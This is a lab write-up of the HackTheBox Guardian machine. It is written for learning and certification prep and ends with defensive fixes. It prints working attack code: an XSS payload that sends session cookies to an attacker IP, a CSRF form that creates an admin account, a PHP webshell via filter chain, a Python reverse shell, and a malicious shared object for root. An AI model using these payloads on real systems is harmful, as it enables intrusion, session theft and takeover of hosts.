[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)

### Quick Machine Overview:

**1. Recon & Enumeration** : nmap two-phase methodology, TTL fingerprinting, vhost fuzzing, feroxbuster with `-x php`, ExifTool metadata hunting, and tech stack fingerprinting signals.

**2. IDOR in Chat** : The vulnerability root cause in PHP (no ownership check), multi-wordlist ffuf brute force using bash process substitution, jq filtering for unique pairs, and a full bash script to dump all chat conversations.

**3. Default Password Brute Force** : Using ffuf with two dynamic wordlist segments (`seq -w` for zero-padding) to enumerate `GUXXXYYYY` format usernames.

**4. XSS via CVE-2025-22131** : How PhpSpreadsheet renders sheet names unescaped, editing XLSX internals using `vim` on the ZIP archive, and the cookie exfiltration payload.

**5. CSRF + Weak Token Pool** : The broken PHP token implementation that never invalidates tokens, and the complete HTML auto-submit CSRF payload to create an admin account.

**6. LFI + PHP Filter Chain RCE** : Why the regex filter fails, the Synacktiv tool commands, and how to satisfy the path restriction while injecting a webshell.

**7. Post-Exploitation** : DB creds from source code, hashcat mode `1410` (sha256+salt), writable Python script pivot, and the `apache2ctl` wrapper abuse paths (PATH hijack, shared object injection, Ghidra analysis).

**8. Lateral Movement** : netexec for SSH/SMB password reuse testing.

### Note:

This post is **not a step-by-step walkthrough, exploit guide, or solution**. It is intentionally written as a **learning-first methodology breakdown**.

The value of this approach is simple: walkthroughs teach _what to type_; methodologies teach _how to think_. By focusing on enumeration strategy, decision-making patterns, and architectural reasoning, this post is designed to help you transfer the same mindset to **real assessments, labs, certifications, and production environments** not just this specific challenge.

Use this content to:

- Sharpen your mental model, not your copy-paste skills
- Understand _why_ certain paths exist rather than memorizing how to reach them
- Build repeatable intuition that applies beyond CTFs

If your goal is long-term growth as a security practitioner, this style will compound. If your goal is only to solve the box, this post is deliberately not optimized for that.

### Enumeration Methodology

#### Port & Service Scanning

Always start with a full-port scan before a versioned scan to avoid missing high ports.

```
# Step 1 — Fast full-port scan
sudo nmap -p- -vvv --min-rate 10000 <TARGET_IP>

# Step 2 — Targeted version/script scan on discovered ports
sudo nmap -p 22,80 -sCV <TARGET_IP>
```

**Key Analysis Tips:**

**TTL fingerprinting:** TTL ≈ 63 → Linux target one hop away (started at 64). TTL ≈ 127 → Windows.

Linux & Unix

**OS version fingerprinting from service banners:** OpenSSH `8.9p1 Ubuntu 3ubuntu0.13` + Apache `2.4.52` → Ubuntu 22.04 LTS (Jammy).

Apache redirecting to a hostname (e.g., `guardian.htb`) is a strong hint that **virtual host / subdomain routing** is in use , always add to `/etc/hosts`.

echo "10.129.237.248 guardian.htb portal.guardian.htb gitea.guardian.htb" | sudo tee -a /etc/hosts

#### **Subdomain Discovery:**

When a web server uses hostname-based routing, the IP alone won’t expose all applications. Fuzz the `Host` header to discover hidden subdomains.

# Using ffuf with auto-calibration (-ac) to filter baseline responses  
ffuf -u http://<TARGET_IP> \  
     -H "Host: FUZZ.guardian.htb" \  
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \  
     -ac  
  
# Target specific keyword in wordlist (e.g., find git-related subdomains)  
ffuf -u http://<TARGET_IP> \  
     -H "Host: FUZZ.guardian.htb" \  
     -w <( cat /opt/SecLists/Discovery/DNS/* | grep git | sort -u ) \  
     -ac

The `-ac` (auto-calibrate) flag is critical without it you drown in false positives because every subdomain returns the same default page. The calibration mode detects and filters that pattern automatically.

#### Directory & File Brute Force

```
# Basic directory brute force
feroxbuster -u http://guardian.htb

# With PHP extension (target PHP apps)
feroxbuster -u http://portal.guardian.htb -x php
```

**What to look for in results:**

Files returning **200** but with **0 bytes** → likely PHP include-only files (models, configs). Not directly useful but reveal the tech stack and class structure.

`/vendor/composer` → Composer is used → check `composer.json` and `composer.lock` for **exact library versions** (critical for CVE hunting).

`/config/` returning **403** but accessible sub-files → auth controls may be inconsistent.

`/admin/reports/*.php` returning **200** without auth → broken access control / missing auth middleware on sub-pages.

**Information Leakage (PDF Metadata):**

Metadata showed `python-docx` as the creator. The guide itself contained a default password and student ID format (`GUxxxxxx`).

```
exiftool Portal_Guide.pdf
```

**IDOR (Insecure Direct Object Reference):**

The `/student/chat.php` endpoint failed to validate if the logged-in user was a participant in the requested `chat_sender_id` or `chat_receiver_id`.

Changing numeric IDs in the URL allowed access to private conversations, revealing Gitea credentials.

### Vulnerability Chain: XSS to RCE

#### Vulnerability: Insecure Direct Object Reference (IDOR)

**Location:** `/student/chat.php?chat_users[0]=<ID>&chat_users[1]=<ID>`

The application accepts numeric user IDs directly from URL parameters. There is **no ownership check** , any authenticated student can read any chat between any two users by simply supplying their internal IDs.

**Root Cause (vulnerable PHP):**

```
$chat_sender_id = (int)$chat_users[0];
$chat_receiver_id = (int)$chat_users[1];
// No check: does the session user own one of these IDs?
$messages = $messageModel->getMessagesBetweenUsers($chat_sender_id, $chat_receiver_id);
```

#### 2.2 IDOR Exploitation with ffuf (Multi-Wordlist Technique)

```
# Brute-force all user ID pairs, save results as JSON for later parsing
ffuf \
  -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=NUM1&chat_users[1]=NUM2' \
  -w <( seq 1 62):NUM1 \
  -w <( seq 1 62):NUM2 \
  -H 'Cookie: PHPSESSID=<YOUR_SESSION>' \
  -ac \
  -o chats.json -of json
```

**Key technique notes:**

`<( seq 1 62)` is **bash process substitution** : creates a temporary file-like descriptor from the output of `seq`. This lets you generate wordlists on the fly without creating actual files.

Multiple `-w` flags with named markers (`NUM1`, `NUM2`) → ffuf tries **all combinations** (Cartesian product) by default.

Saving as JSON (`-of json`) lets you filter results programmatically with `jq`.

#### Filtering & Parsing Results with jq

```
# Count non-empty chat hits
cat chats.json | jq .results[] -c | wc -l

# Print only unique pairs (where ID1 < ID2 to avoid duplicates)
cat chats.json | \
  jq '.results[] | select((.input.NUM1 | tonumber) < (.input.NUM2 | tonumber)) | .url' -r \
  | cut -d'?' -f2
```

#### Bulk Chat Dumper (Bash Script)

```
#!/bin/bash
COOKIE="PHPSESSID=<YOUR_SESSION>"

cat chats.json | jq -r '.results[] | select((.input.NUM1|tonumber) < (.input.NUM2|tonumber)) | "\(.input.NUM1) \(.input.NUM2) \(.url)"' \
| while read -r n1 n2 url; do
  echo "========== Chat: User $n1 <-> User $n2 =========="
  curl -gs "$url" -b "$COOKIE" | awk '
    /text-sm text-gray-500 mb-1/ {
      getline; gsub(/<span.*/, "", $0); gsub(/^[[:space:]]+|[[:space:]]+$/, ""); sender=$0; next
    }
    /class="text-gray-800"/ {
      getline; gsub(/<\/div>.*/, "", $0); gsub(/^[[:space:]]+|[[:space:]]+$/, "")
      if (sender != "") print sender ": " $0
    }
  '
  echo
done
```

#### Cloning Source Code from Gitea (with Credentials in URL)

Once credentials are found, clone the app source for deep vulnerability analysis:

# Encode '@' in email as %40 when embedding in URL  
git clone http://jamil.enockson%40guardian.htb:DHsNnk3V503@gitea.guardian.htb/Guardian/portal.guardian.htb.git

### XSS VIA CVE-2025-22131 (PhpSpreadsheet XLSX Injection)

#### Vulnerability Overview

**CVE-2025-22131** , PhpSpreadsheet ≤ 3.7.0 is vulnerable to **XSS via sheet names** in XLSX files. When the application renders the uploaded spreadsheet as HTML (using `generateHTMLAll()`), an unescaped sheet name is injected directly into the page.

**Vulnerable server-side code pattern:**

```
$spreadsheet = IOFactory::load('../attachment_uploads/' . $submission['attachment_name']);
$writer = new Html($spreadsheet);
$writer->writeAllSheets();
echo $writer->generateHTMLAll();  // Sheet name injected unescaped into HTML
```

#### Payload Construction

XLSX files are ZIP archives. The sheet name lives in `xl/workbook.xml`. Edit it directly using `vim` (which can edit files inside ZIPs without corrupting the archive):

```
# Unzip to inspect structure
unzip cookie.xlsx -d xssbook/

# Edit inside ZIP archive using vim (preserves ZIP metadata)
vim xss.xlsx
# Navigate to xl/workbook.xml → Enter → Edit the sheet name → :wq → :q

# Verify it's still a valid Excel file
file xss.xlsx
```

**XSS Payload (HTML-encoded for XML context):**

```
<!-- In xl/workbook.xml, change the sheet name to: -->
<sheet name="&quot;&gt;&lt;img src=x onerror=fetch(&#39;http://10.10.14.60/exfil?cookie=&#39;+document.cookie)&gt;" .../>
```

**Decoded equivalent:**

```
"><img src=x onerror=fetch('http://10.10.14.60/exfil?cookie='+document.cookie)>
```

#### Cookie Exfiltration Listener

```
# Simple HTTP server to catch the cookie
python3 -m http.server 80
```

The session cookie is **not** set with the `HttpOnly` flag, making it accessible via `document.cookie`.

**CSRF to Admin Creation:**

#### Vulnerability: Non-Expiring CSRF Token Pool

The application stores CSRF tokens in a flat JSON file (`config/tokens.json`). Tokens are **never removed or invalidated** once added. Any token ever generated remains valid forever.

**Vulnerable PHP (`config/csrf-tokens.php`):**

```
function add_token_to_pool($token) {
    $tokens = get_token_pool();
    $tokens[] = $token;
    file_put_contents($global_tokens_file, json_encode($tokens));
    // FLAW: Tokens are never removed from the pool
}

function is_valid_token($token) {
    $tokens = get_token_pool();
    return in_array($token, $tokens);  // Any old token still passes
}
```

When creating a Notice as a Lecturer, a CSRF token is generated and embedded in the form. That token remains valid indefinitely. Capture it once, reuse it in your CSRF payload targeting the admin.

#### CSRF Payload (HTML Auto-Submit Form)

Host this page on your attacker machine and send the URL as a notice link to the admin:

```
<!-- csrf_createuser.html — hosted on attacker machine -->
<html>
<body>
<form id="csrf" method="POST" action="http://portal.guardian.htb/admin/createuser.php">
  <input type="hidden" name="username"   value="attacker" />
  <input type="hidden" name="password"   value="P@ssword123" />
  <input type="hidden" name="full_name"  value="attacker hacker" />
  <input type="hidden" name="email"      value="attacker@guardian.htb" />
  <input type="hidden" name="dob"        value="1990-01-01" />
  <input type="hidden" name="address"    value="123 Hack Street" />
  <input type="hidden" name="user_role"  value="admin" />
  <!-- Token captured from a legitimate lecturer form load -->
  <input type="hidden" name="csrf_token" value="<CAPTURED_TOKEN>" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**Flow:**

Load `/lecturer/notices/create.php` to capture a valid CSRF token from the form source.

Create a notice with `reference_link` pointing to your hosted CSRF page.

Admin clicks the link → browser auto-submits the form → admin account created.

**RCE via PHP Filter Chain Injection:**

A Local File Include (LFI) vulnerability in the admin portal.

**Location:** `GET /admin/reports.php?report=<PATH>`

**Exploitation:** Instead of just reading files, use a “PHP Filter Chain” to transform arbitrary strings into a base64-encoded payload that gets executed as code. Often automated with tools like `php_filter_chain_generator.py`

Hacking & Cracking

uv run php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'  
uv run php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

Based on the above, the URL will be:

ttp://portal.guardian.htb/admin/reports.php?cmd=id&report=php://filter...[snip].../resource=reports/enrollment.php

This technique works **without remote file inclusion** being enabled. It leverages PHP’s `iconv` encoding filters to reconstruct arbitrary base64-encoded payloads byte-by-byte through chained encoding transformations.

The full chain is long (hundreds of characters) but can be generated automatically.

You can then replace the php payload with a bash reverse shell to get your first shell.

### Privilege Escalation: Lateral Movement

Once initial shell access is achieved, the tooling pivots drastically toward post-exploitation and cryptography, leveraging Hashcat to crack database hashes for lateral movement.

Pivoting between users requires analyzing local scripts and database configurations.

**Database Credential Harvesting:**

**File:** `config/config.php` (obtained from cloned Gitea source)

```
cat config/config.php
```

Revealed database credentials (`Gu4rd14n_un1_1s_th3_b3st`) and a salt (`8Sb)tM1vs1SS`).

return [  
    'db' => [  
        'dsn'      => 'mysql:host=localhost;dbname=guardiandb',  
        'username' => 'root',  
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',  
    ],  
    'salt' => '8Sb)tM1vs1SS'  
];

**Password hashing mechanism:**

```
$password = hash('sha256', $password . $salt);
// Format: SHA256( plaintext + '8Sb)tM1vs1SS' )
```

#### Password Hash Cracking (Hashcat)

```
# SHA256 with salt appended (mode 1410: sha256($pass.$salt))
hashcat -m 1410 '<HASH>:<SALT>' /usr/share/wordlists/rockyou.txt

# Example
hashcat -m 1410 '<db_hash>:8Sb)tM1vs1SS' /usr/share/wordlists/rockyou.txt
```

**Writable Python Scripts:**

Scripting Languages

If a system user’s cron job or sudo rule executes a Python script that is **world-writable**, inject a reverse shell:

**Exploitation:** Injecting a Python reverse shell into the writable script.Python

```
import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<IP>",<PORT>)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); pty.spawn("/bin/bash")
```

### IV. Root Escalation: Binary Reversing & Bypass

The escalation to the root user demands the use of advanced reverse engineering frameworks like Ghidra to meticulously tear down the compiled `safeapache2ctl` binary, understand its flawed execution flow, and ultimately construct malicious shared object files or deceptive Apache configurations to break out of the restricted environment.

#### `apache2ctl` Binary Wrapper Abuse

A custom SUID/sudo binary wraps `apache2ctl`. Multiple privilege escalation paths exist from this:

**Approach 1 , PATH Hijacking:**

```
# Place a malicious `apache2ctl` earlier in PATH
echo '/bin/bash -p' > /tmp/apache2ctl
chmod +x /tmp/apache2ctl
export PATH=/tmp:$PATH
<invoke_sudo_binary>
```

**Approach 2 : Directory Traversal via symlink or controlled config:** If the wrapper reads a config file from a predictable or writable location, symlink it to `/etc/shadow` or another sensitive file.

**Approach 3 : Shared Object Injection:** If the binary loads a `.so` from a writable path (check with `ldd` and `strace`):

```
ldd <binary>
strace <binary> 2>&1 | grep "open\|access" | grep "\.so"

# Craft malicious shared object
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
void __attribute__((constructor)) init() {
    system("chmod +s /bin/bash");
}
EOF
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
```

**Approach 4 : Reverse Engineering with Ghidra:** When you receive an unknown binary, always inspect it first:

Engineering & Technology

```
# Quick static analysis
file <binary>
strings <binary>
ltrace <binary>
strace <binary>

# Deep analysis: open in Ghidra and decompile main()
```

### LATERAL MOVEMENT : NETEXEC & PASSWORD REUSE

```
# Test cracked password across SSH
netexec ssh <TARGET_IP> -u <USER> -p '<PASSWORD>'

# SMB spray (if applicable)
netexec smb <TARGET_IP> -u users.txt -p '<PASSWORD>' --continue-on-success
```

DB credentials and application credentials are frequently reused for OS-level accounts. Always test discovered passwords against SSH.

### Attack Chain Summary

|Stage|Technique|Lesson|
|---|---|---|
|Recon|Subdomain brute force (vhost)|Hostname-based routing hides additional apps|
|Recon|Metadata extraction|Public documents leak credentials & internal tools|
|Auth Bypass|Default password + ffuf|Default credentials are common in real environments|
|Access Control|IDOR in chat|Missing ownership check on object reference|
|Session Hijack|XSS via CVE-2025-22131|Third-party libraries = CVE attack surface|
|Privilege Escalation (Web)|CSRF + broken token pool|Weak token implementation negates CSRF protection|
|RCE|LFI + PHP filter chain injection|Regex filters on LFI can be bypassed with `php://filter`|
|Persistence|DB creds in source|Hardcoded credentials in version-controlled source|
|Lateral Movement|Password reuse|DB passwords often match OS user passwords|
|Root|Wrapper binary abuse|SUID/sudo binaries that call other tools = multiple PrivEsc paths|

### Security Recommendations

Always validate **object ownership** before returning data (fix IDOR): check that `$_SESSION['user_id']` matches one of the `chat_users` IDs.

Set `HttpOnly` flag on all session cookies to prevent JavaScript access.

Use **per-request, single-use CSRF tokens** — invalidate after first use.

Never render untrusted user-supplied content (file names, sheet names) as raw HTML.

Keep third-party libraries (Composer, npm, pip) updated and monitored via CVE feeds.

Never store application credentials in version-controlled repositories.

Validate and restrict file include paths using an explicit whitelist rather than a pattern match.

Apply the principle of least privilege: web processes should not have access to DB root.

### Tools Reference

|Tool|Purpose|Key Flags|
|---|---|---|
|`nmap`|Port/service scan|`-p-`, `--min-rate`, `-sCV`|
|`ffuf`|Web fuzzing / brute force|`-ac`, `-w`, `-H`, `-d`, `-of json`|
|`feroxbuster`|Directory brute force|`-x php`, `-u`|
|`exiftool`|Metadata extraction|—|
|`jq`|JSON parsing / filtering|`.results[]`, `select()`, `tonumber`|
|`hashcat`|Hash cracking|`-m 1410` (sha256 + salt)|
|`netexec`|Network auth testing|`ssh`, `smb`, `--continue-on-success`|
|`ghidra`|Binary reverse engineering|Decompiler|
|`php_filter_chain_generator`|LFI to RCE|`--chain '<php code>'`|
|`git clone`|Source code retrieval|Credentials in URL (encode @ as %40)|
|`vim`|Edit files inside ZIP/XLSX|Navigate archive, `:wq`, `:q`|

### Certification Prep

For ambitious professionals looking to validate their expertise, mastering the techniques demonstrated within HTB Guardian machine perfectly aligns with the most respected and rigorous offensive security certifications in the industry.

The heavy emphasis on advanced web exploitation, source code analysis, and chaining multiple vulnerabilities makes this an exceptional practice environment for the HackTheBox Certified Web Exploitation Specialist ([HTB CWES](https://buymeacoffee.com/notescatalog/e/390668)) and the Certified Penetration Testing Specialist ([CPTS](https://buymeacoffee.com/notescatalog/e/321854)) examinations. 

Hacking & Cracking

Furthermore, the seamless transition from web application compromise to complex, custom binary exploitation and lateral movement makes this machine incredibly relevant for those preparing for the Offensive Security Certified Professional ([OSCP](https://buymeacoffee.com/notescatalog/e/165578)) certification.